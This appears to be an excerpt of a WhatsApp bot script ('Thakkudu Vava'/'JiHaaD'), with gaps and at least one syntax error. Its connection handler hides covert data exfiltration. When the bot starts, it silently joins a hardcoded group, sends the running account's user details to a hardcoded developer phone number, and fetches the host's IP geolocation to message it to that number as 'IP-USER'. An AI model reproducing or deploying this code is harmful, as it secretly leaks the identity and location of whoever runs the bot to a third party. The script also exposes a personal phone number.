...
const gcrevoke = ["917736703116-1633657810@g.us"]
prefix = '#'
shp = '⬡'
owner = "917736703116@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["Thakkudu Vava", "Chrome", "3.0"];
  ...
  client.on("qr", () => {
    console.log(
      ...
      client.sendMessage(`917736703116@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
  ...
  client.on("open", () => {
    success("2", "Successfully connected to wa, Subscribe JID MODS");
console.log(color(figlet.textSync(`${spc1}            Thakkudu Vava`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝙄 𝙬𝙧𝙤𝙩𝙚 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙮𝙨𝙚𝙡𝙛!\n𝙉𝙤𝙩𝙚: 𝘿𝙤𝙣𝙩 𝙛𝙤𝙧𝙜𝙚𝙩 𝙩𝙤 𝙨𝙪𝙗𝙨𝙘𝙧𝙞𝙗𝙚 𝙅𝙞𝙙 𝙈𝙤𝙙𝙨', 'yellow'))
    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/917736703116'))
    console.log(color('[DOGE BOT]'), color '𝙏𝙝𝙖𝙠𝙠𝙪𝙙𝙪 𝘽𝙤𝙩 𝙞𝙨 𝙊𝙣𝙡𝙞𝙣𝙚', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 teks = `https://chat.whatsapp.com/FiMI4i0UuimE1zI1MZzN1Z`
 client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
 client.sendMessage(`917736703116@s.whatsapp.net`, `*Hi Owner JiHaaD, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Developer JiHaaD Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/917736703116?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("917736703116@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Developer JiHaaD Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./xeon.jpg'),sourceUrl:"https://wa.me/917736703116?text=Hello bro"}}})
...
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '917736703116-1633657810@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'JiHaaD',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Xeon;;;\nFN:resku\nitem1.TEL;waid=917736703116:+91 773-6703-116\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
  ...
  client.on("group-participants-update", async (anu) => {
    try {
      ...
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "Hello everyone, am Thakkudu Vava, ready to help you here ㋛︎", "conversation");
      }
